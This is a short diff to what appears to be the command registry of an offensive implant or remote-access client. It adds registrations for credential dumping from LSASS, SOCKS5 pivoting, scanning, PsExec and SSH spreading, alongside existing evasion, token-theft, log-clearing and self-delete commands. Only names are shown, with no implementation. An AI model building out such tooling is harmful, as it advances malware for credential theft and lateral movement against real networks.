@@ -12,7 +12,8 @@ from client.commands.stealth_commands import (
     EvasionCommand, DetectVMCommand, InjectCommand, StealTokenCommand,
     RevertTokenCommand, WhoamiCommand, EnablePrivilegeCommand,
     ClearLogsCommand, TimestompCommand, SelfDeleteCommand,
-    HollowCommand, MigrateCommand,
+    HollowCommand, MigrateCommand, LsassDumpCommand, Socks5Command,
+    ScanCommand, PsexecCommand, SSHSprdCommand,
 )
 
 
@@ -61,4 +62,9 @@ def build_client_registry() -> CommandRegistry:
     registry.register(SelfDeleteCommand())
     registry.register(HollowCommand())
     registry.register(MigrateCommand())
+    registry.register(LsassDumpCommand())
+    registry.register(Socks5Command())
+    registry.register(ScanCommand())
+    registry.register(PsexecCommand())
+    registry.register(SSHSprdCommand())
     return registry
